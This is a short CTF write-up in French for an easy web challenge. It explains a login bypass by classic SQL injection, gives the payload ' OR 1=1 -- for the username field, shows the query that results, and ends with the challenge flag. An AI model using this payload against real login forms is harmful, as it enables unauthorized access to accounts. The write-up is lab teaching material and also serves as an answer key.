---
titre: "Login Bypass — SQL Injection classique"
ctf: ExampleCTF 2024
date: 2024-03-20
categorie: web
difficulte: easy
tags: [sql, injection, authentication]
points: 100
---

## Description du challenge

> Un site de connexion semble mal protégé. Trouvez un moyen de vous connecter sans connaître le mot de passe.

## Analyse

En inspectant le formulaire de login, on remarque que les entrées ne sont pas filtrées côté serveur.

## Solution

Injection dans le champ `username` :

```
' OR 1=1 -- 
```

La requête SQL devient :

```sql
SELECT * FROM users WHERE username='' OR 1=1 -- ' AND password='...'
```

La condition `1=1` est toujours vraie, la partie `AND password` est commentée : on obtient le premier utilisateur de la table.

## Flag

`FLAG{sql_1nj3ct10n_b4s1qu3}`
